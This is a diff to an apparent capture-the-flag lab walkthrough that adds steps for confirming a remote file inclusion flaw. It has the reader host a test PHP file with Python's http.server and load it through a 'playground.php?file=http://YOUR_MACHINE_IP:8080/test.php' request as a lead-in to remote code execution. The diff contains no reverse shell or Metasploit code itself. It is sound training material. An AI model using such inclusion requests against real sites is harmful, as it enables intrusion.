@@ -97,7 +97,7 @@ This will return the below with the required flag for task 3.
 
 ## 🛠️ TASK 4: Gain RCE in Lab #Playground and find the hostname
 As mentioned in the top summary I will demonstrate two different methods to gain RCE access to this lab one via Metasploit and one by loading a TCP Reverse Shell manually.  
-But first lets to a quick manual test to verify the RFI vulnerability.  
+But first lets to a quick manual test to verify the RFI vulnerability, is actually present, before we work on obtaining RCE access.    
 Open up your terminal and input ```echo "Hello World" > test.php``` This will create a .PHP file with "Hello World"  
 ![lab4_hello_world](./Images/lab4_hello_world.png)  
 
@@ -107,7 +107,17 @@ Next we need to setup a http server in the same directory as our file which will
 -m option is used to tell python to search for and run a specific module in this instance the http.server module.  
 
 Which would look like this  
-![lab4_http_server](./Images/Lab4_http_server.png)
+![lab4_http_server](./Images/Lab4_http_server.png)  
+We now have running a http.server in our directoy which will allow us to download the test.php file from the web server.  
+
+Navigate back to the playground webpage and enter the following into the address bar ```MACHINE_IP/playground.php?file=http://YOUR_MACHINE_IP:8080/test.php```  
+If done correctly we will be able to see a **GET** requested recived in our terminal with the running http server as below.
+![lab4_pull_request](./Images/lab4_pull_request.png)
+
+And we can also confirm the test on the website where we can see the output contents of our file.
+![lab4_web_result](./Images_lab4_web_result)  
+
+This confirms there is a RFI vulnerability which we can exploit to gain RCE access.  
 
 ### 🔥 Metasploit option  
 
